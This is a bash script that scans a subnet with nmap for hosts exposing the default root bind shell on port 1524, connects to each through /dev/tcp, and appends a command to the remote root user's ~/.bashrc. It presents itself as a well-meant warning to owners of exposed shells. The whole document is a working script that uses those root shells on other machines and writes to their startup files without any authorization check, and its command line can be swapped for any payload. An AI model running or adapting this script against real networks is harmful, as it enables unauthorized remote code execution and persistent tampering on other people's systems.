#!/bin/bash
echomessage='Hello,' #Requires the first 'word' in the echo message, used to check if an existing message is already set
rootshellcommand='echo "Hello, Please dont leave default rootshells open"' #dont remove the echo, onlt change the message
network='192.168.0.0/24' #change this to the network you're scanning
port='1524' #default (vulnerable) Ingres service

#the nmap line was quick and dirty: im sure theres plenty of better ways to do this
#grabs the 4th line above an open port output, teh 4th line contains the ip. outputs the ip to a tmp file for later use
nmap --script=banner $network -p $port | grep "open" -B 4 -A 1 | grep '192' | awk -v OFS="\n" '{ print $5 }' > outputtmp.txt
linenumber=$(wc -l outputtmp.txt | awk '{ print $1 }')
for x in `seq 1 "$linenumber"`
do
        #reads the ip from the tmp file, reads line x in the for loop
        var=$(sed "${x}q;d" outputtmp.txt)
        
        #creates the socket for the pseudo terminal 
        exec 3<>/dev/tcp/$var/1524;
        header=$(head -n 1 <&3 | awk '{ print $1 }')
        if [ $header = $echomessage ]
        then
           echo "$var: Skipped, message already added"
        else
           echo "$var:$port - default metasploit root shell found, message added"
           exec 5<>/dev/tcp/$var/1524;
           #3 echos used, one to output the command over the pseudo terminal, one to execute *on* the pseudo terminal, and one that is appended to the .bashrc file
           #could have probably used cat..
           echo "echo '$rootshellcommand' >> ~/.bashrc" >&5

        fi
done